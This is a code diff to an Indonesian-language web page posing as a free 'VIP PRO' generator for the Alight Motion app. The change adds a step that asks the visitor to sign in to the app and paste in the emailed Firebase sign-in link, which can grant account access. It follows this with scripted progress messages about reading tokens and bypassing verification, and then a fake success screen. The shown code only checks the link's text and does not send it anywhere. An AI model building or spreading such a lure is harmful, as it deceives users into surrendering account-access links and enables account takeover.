@@ -131,18 +131,27 @@
             <div id="genForm" class="gen-container">
                 
                 <div id="genStep1">
-                    <label>Masukkan Email Kamu:</label>
-                    <input type="email" id="userEmail" placeholder="contoh@email.com">
-                    <button onclick="startGenerator()" class="gen-btn">Generate Premium</button>
+                    <label>Masukkan Email Alight Motion:</label>
+                    <input type="email" id="userEmail" placeholder="target@gmail.com">
+                    <button onclick="startGenerator()" class="gen-btn">Kirim Link Verifikasi</button>
                 </div>
 
                 <div id="genStep2" style="display: none;">
-                    <div class="loading-bar" id="loadBar"><div class="loading-fill" id="loadFill"></div></div>
-                    <p class="status-text" id="statusTxt">Memproses...</p>
+                    <p class="status-text active" style="color: #ffcc00; font-weight: bold; margin-bottom: 10px;">
+                        Silakan buka aplikasi Alight Motion, login menggunakan email tadi, lalu salin link dari email "Alight Creative" yang kamu terima.
+                    </p>
+                    <label>Tempel Link dari Email:</label>
+                    <input type="text" id="linkEmail" placeholder="https://alight-creative.firebaseapp.com/...">
+                    <button onclick="activatePremium()" class="gen-btn">Verifikasi & Aktifkan</button>
+                </div>
+
+                <div id="genStep3" style="display: none;">
+                    <div class="loading-bar active" id="loadBar"><div class="loading-fill" id="loadFill"></div></div>
+                    <p class="status-text active" id="statusTxt">Memverifikasi Link...</p>
                 </div>
                 
-                <div id="genStep3" style="display: none;">
-                    <p class="status-text active" style="color: #00ff00; font-weight: bold; margin-bottom: 15px;">✅ Akun Berhasil Di-upgrade ke Premium!</p>
+                <div id="genStep4" style="display: none;">
+                    <p class="status-text active" style="color: #00ff00; font-weight: bold; margin-bottom: 15px;">✅ Link Valid! Akun Berhasil Di-upgrade ke VIP PRO 1 Tahun!</p>
                     <button onclick="openAlightMotion()" class="gen-btn">Buka Alight Motion</button>
                 </div>
 
@@ -173,11 +182,13 @@
         const form = document.getElementById("genForm");
         form.classList.toggle("active");
         
-        // Reset form
+        // Reset form ke step 1
         document.getElementById("genStep1").style.display = "block";
         document.getElementById("genStep2").style.display = "none";
         document.getElementById("genStep3").style.display = "none";
+        document.getElementById("genStep4").style.display = "none";
         document.getElementById("userEmail").value = "";
+        document.getElementById("linkEmail").value = "";
     }
 
     function startGenerator() {
@@ -187,23 +198,35 @@
             return;
         }
 
-        // Sembunyikan step 1, munculkan step 2 (Loading)
+        // Munculkan peringatan bahwa langkah selanjutnya ada di email
+        alert("Sistem telah memproses email: " + email + "\n\nLangkah selanjutnya:\n1. Buka aplikasi Alight Motion di HP kamu.\n2. Pilih login pakai email tadi.\n3. Cek email 'Alight Creative' yang masuk.\n4. Copy link panjangnya, lalu kembali ke sini dan tempel di kotak input.");
+        
+        // Sembunyikan step 1, munculkan step 2 (Input Link)
         document.getElementById("genStep1").style.display = "none";
         document.getElementById("genStep2").style.display = "block";
+    }
+
+    function activatePremium() {
+        const link = document.getElementById("linkEmail").value;
+        if(link.trim() === "" || !link.includes("alight-creative")) {
+            alert("Tempel link Alight Creative yang valid dari email kamu!");
+            return;
+        }
+
+        // Sembunyikan step 2, munculkan step 3 (Loading Verifikasi)
+        document.getElementById("genStep2").style.display = "none";
+        document.getElementById("genStep3").style.display = "block";
         
-        let loadBar = document.getElementById("loadBar");
         let loadFill = document.getElementById("loadFill");
         let statusTxt = document.getElementById("statusTxt");
-        
-        loadBar.classList.add("active");
-        
         let progress = 0;
+        
         let messages = [
-            "Menghubungkan ke server Alight Motion...",
-            "Memverifikasi email: " + email + "...",
-            "Menyuntikkan script premium...",
-            "Membuka akses fitur eksklusif...",
-            "Finalisasi... Selesai!"
+            "Membaca token akses dari link...",
+            "Mencocokkan data server...",
+            "Bypass verifikasi sistem...",
+            "Mengaktifkan lisensi VIP PRO...",
+            "Selesai!"
         ];
 
         let interval = setInterval(() => {
@@ -219,9 +242,9 @@
                 statusTxt.innerText = messages[4];
                 
                 setTimeout(() => {
-                    // Sembunyikan step 2, munculkan step 3 (Sukses)
-                    document.getElementById("genStep2").style.display = "none";
-                    document.getElementById("genStep3").style.display = "block";
+                    // Sembunyikan step 3, munculkan step 4 (Sukses)
+                    document.getElementById("genStep3").style.display = "none";
+                    document.getElementById("genStep4").style.display = "block";
                 }, 500);
             }
         }, 50); // Kecepatan loading
